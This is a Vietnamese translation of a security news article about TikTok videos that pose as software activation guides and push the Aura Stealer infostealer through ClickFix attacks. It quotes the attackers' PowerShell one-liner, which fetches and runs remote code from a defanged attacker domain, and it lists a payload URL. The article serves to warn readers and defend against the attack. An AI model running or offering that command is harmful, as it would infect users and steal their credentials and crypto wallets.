# Video trên TikTok tiếp tục phát tán phần mềm đánh cắp thông tin thông qua các cuộc tấn công ClickFix

![TikTok](https://www.bleepstatic.com/content/hl-images/2022/08/31/TikTok.jpg)

Tin tặc đang sử dụng các video trên TikTok giả danh hướng dẫn kích hoạt miễn phí cho phần mềm phổ biến như Windows, Spotify và Netflix để phát tán mã độc đánh cắp thông tin.

ISC Handler Xavier Mertens phát hiện chiến dịch đang diễn ra này, chủ yếu giống với chiến dịch [được quan sát bởi Trend Micro](https://www.bleepingcomputer.com/news/security/tiktok-videos-now-push-infostealer-malware-in-clickfix-attacks/) vào tháng Năm

Các video trên TikTok mà BleepingComputer thấy giả vờ cung cấp hướng dẫn cách kích hoạt các sản phẩm hợp pháp như Windows, Microsoft 365, Adobe Premiere, Photoshop, CapCut Pro và Discord Nitro, cũng như các dịch vụ bịa đặt như Netflix và Spotify Premium.

![](https://www.bleepstatic.com/images/news/security/t/tiktok/infostealers/tiktok-videos.jpg)

**Video độc hại trên TikTok phát tán phần mềm đánh cắp thông tin**  
_Nguồn: BleepingComputer.com_

Các video đang thực hiện một cuộc tấn công ClickFix, một kỹ thuật xã hội hóa cung cấp những “khắc phục” hoặc hướng dẫn có vẻ hợp lệ nhằm lừa người dùng thực thi các lệnh PowerShell độc hại hoặc các script khác khiến máy tính bị nhiễm mã độc.

Mỗi video hiển thị một lệnh ngắn một dòng và bảo người xem chạy nó với quyền administrator trong PowerShell:

```
iex (irm slmgr[.]win/photoshop)
```

Cần lưu ý rằng tên chương trình trong URL khác nhau tùy theo chương trình bị mạo danh. Ví dụ, trong các video kích hoạt Windows giả, thay vì URL chứa _photoshop_, nó sẽ bao gồm _windows_.

Trong chiến dịch này, khi lệnh được thực thi, PowerShell kết nối đến trang từ xa slmgr\[.\]win để truy xuất và thực thi một script PowerShell khác.

Script này tải xuống hai file thực thi từ Cloudflare pages, với file thực thi đầu tiên được tải xuống từ https://file-epq\[.\]pages\[.\]dev/updater.exe \[[VirusTotal](https://www.virustotal.com/gui/file/58b11b4dc81d0b005b7d5ecae0fb6ddb3c31ad0e7a9abf9a7638169c51356fd8)\]. File thực thi này là một biến thể của [Aura Stealer](http://AuroStealer) — mã độc đánh cắp thông tin.

Aura Stealer thu thập thông tin đăng nhập đã lưu từ các trình duyệt, cookie xác thực, ví tiền mã hóa và thông tin đăng nhập từ các ứng dụng khác và tải chúng lên kẻ tấn công, cho phép chúng truy cập vào tài khoản của bạn.

Mertens cho biết một payload bổ sung sẽ được tải xuống, có tên source.exe \[[VirusTotal](https://www.virustotal.com/gui/file/db57e4a73d3cb90b53a0b1401cb47c41c1d6704a26983248897edcc13a367011)\], được sử dụng để tự biên dịch mã bằng Visual C# Compiler (csc.exe) tích hợp sẵn của .NET. Mã này sau đó được tiêm và khởi chạy trong bộ nhớ.

Mục đích của payload bổ sung vẫn chưa rõ ràng.

Người dùng thực hiện những bước này nên xem tất cả thông tin đăng nhập của họ có khả năng đã bị xâm phạm và ngay lập tức đặt lại mật khẩu trên tất cả các trang họ truy cập.

Các cuộc tấn công ClickFix đã trở nên rất phổ biến trong năm qua, được sử dụng để phân phối nhiều họ mã độc khác nhau trong các chiến dịch tống tiền và đánh cắp tiền mã hóa.

Theo nguyên tắc chung, người dùng không bao giờ nên sao chép văn bản từ một trang web và chạy nó trong hộp thoại hệ điều hành, bao gồm trong [File Explorer address bar](https://www.bleepingcomputer.com/news/security/filefix-attack-weaponizes-windows-file-explorer-for-stealthy-powershell-commands/), command prompt, PowerShell prompts, macOS terminal và Linux shells.